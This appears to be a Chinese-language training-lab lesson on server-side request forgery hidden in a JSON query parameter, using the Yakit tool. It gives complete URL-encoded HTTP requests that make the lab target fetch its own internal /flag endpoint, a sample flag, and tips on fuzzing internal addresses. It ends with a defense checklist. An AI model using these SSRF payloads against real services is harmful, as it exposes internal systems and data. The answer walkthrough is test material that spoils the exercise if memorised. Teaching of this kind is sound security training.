---
title: SSRF 进阶：藏在 JSON 里的跳板与批量验证
difficulty: practitioner
---

# SSRF 进阶：藏在 JSON 里的跳板与批量验证

## 原理背景

真实业务的 SSRF 很少是明晃晃的 `?url=`，更常见的是**结构化参数里藏着 URL 字段**——前端把配置、回调地址、引用链接打包成 JSON 传给后端，后端取其中某个字段发起请求：

```
/ssrf/json-in-get?json={"abc": 123, "ref": "http://example.com"}
```

靶场只认 `ref` 字段：JSON 里没有 `ref` 会直接回 `no ref in json found!`，JSON 格式错误回 `JSON Syntax Error: ...`。攻击面本质没变（还是"服务端替你请求"），但构造复杂度上来了——JSON 里的引号、花括号进 URL 前都要**正确编码**，一个字符错就整条失效。

## Yakit 操作步骤

**Codec 双重编码**：

1. 先写好纯 JSON payload（服务端只取 `ref` 字段，其余可省）；
2. 整体做 **URL 编码**，把结果填进 `?json=` 参数；
3. 编码粒度可以多试几档（只编特殊字符 vs 全量编码），体会服务端解码行为的差异。

**Web Fuzzer 批量验证**：把 JSON 里 `ref` 的目标地址参数化成多个候选（内网回环、内网网段、反连域名），一次执行并排比对响应——真实打点时你并不知道哪个协议、哪个端口通，批量试错才是常态。

**热加载（选学）**：MITM/插件的**热加载**机制支持用 Yak 脚本在请求发出前自动改写——比如自动把 JSON 里的 URL 字段替换成反连地址。会写几行 Yak，重复劳动就能交给机器。

## 开始实战

点击 **前往配套题目练习**，启动环境后：构造只含 `ref` 字段、指向 `http://127.0.0.1:8787/ssrf/flag` 的 JSON，URL 编码后作为 `json` 参数发给 `/ssrf/json-in-get`，从响应原文里拿到 flag 提交（与上一课同源，正则判定，拿到哪个交哪个）。

<details>
<summary>📋 详细步骤（点击展开，照做即可拿到答案）</summary>

以下以实例地址 `http://127.0.0.1:36870` 为例——**端口每次启动环境都随机分配，请替换成你题目页显示的端口**。

**第 1 步：启动实验环境**

题目详情页点「启动实验环境」，等状态 running，复制访问地址（形如 `http://127.0.0.1:36870`）。

**第 2 步：先感受"没有 ref"的报错**

```http
GET /ssrf/json-in-get?json=%7B%22abc%22%3A123%7D HTTP/1.1
Host: 127.0.0.1:36870
```

（`%7B%22abc%22%3A123%7D` 是 `{"abc":123}` 的 URL 编码。）响应：

```
no ref in json found!
```

——确认服务端解析了 JSON 并在找 `ref` 字段。

**第 3 步：构造带 ref 的 payload 并整体 URL 编码**

原始 JSON（只留 `ref` 一个字段就够）：

```json
{"ref":"http://127.0.0.1:8787/ssrf/flag"}
```

用 Codec 做 URL 编码后得到：

```
%7B%22ref%22%3A%22http%3A%2F%2F127.0.0.1%3A8787%2Fssrf%2Fflag%22%7D
```

**第 4 步（演示）：发送请求，让靶场自请求 /ssrf/flag**

```http
GET /ssrf/json-in-get?json=%7B%22ref%22%3A%22http%3A%2F%2F127.0.0.1%3A8787%2Fssrf%2Fflag%22%7D HTTP/1.1
Host: 127.0.0.1:36870
```

响应是靶机自己请求 `/ssrf/flag` 后**原样转发**的响应原文（状态行 + 响应头 + HTML），在 body 末尾的 `<div>` 里：

```html
<div>
	flag{3aa727b8-1fa3-4570-9f14-759c9905b499}
</div>
```

（uuid 每次请求都不同。）这个随机 uuid 是**上游演示接口**的产物，不是本题要提交的 flag——本题 flag 读靶机根路径 `/flag`（见下一步）。

**第 5 步：用 SSRF 读取本实例 flag**

靶机为本次启动的环境单独生成了唯一 flag（形如 `flag{lab-xxxx}`），读取端点在靶机根路径 `GET /flag`（校验与 `/ssrf/flag` 相同：只信任 Host 含 `127.0.0.1` 的服务端本机请求）。

把攻击请求里的目标从 `/ssrf/flag` 换成 `/flag`（`ref` 指向靶机根路径的读取端点），整体 URL 编码后发送：

```http
GET /ssrf/json-in-get?json=%7B%22ref%22%3A%22http%3A%2F%2F127.0.0.1%3A8787%2Fflag%22%7D HTTP/1.1
Host: 127.0.0.1:36870
```

响应中就是 flag 原文（`flag{lab-...}`）。

**第 6 步：提交答案**

回到题目详情页，在答案框输入 flag 原文（`flag{lab-...}` 整串）提交。

</details>

## 延伸：SSRF 防御面面观

防御 SSRF 的清单：目标地址白名单（域名+网段）、禁用危险协议（`file://`、`gopher://`）、DNS 解析后二次校验 IP（防 DNS rebinding）、绝不跟随重定向。审计代码时搜"用户输入 → HTTP 客户端 URL"的数据流，是找到这类问题的最短路径。

下一课：文件上传——骗过魔数校验。
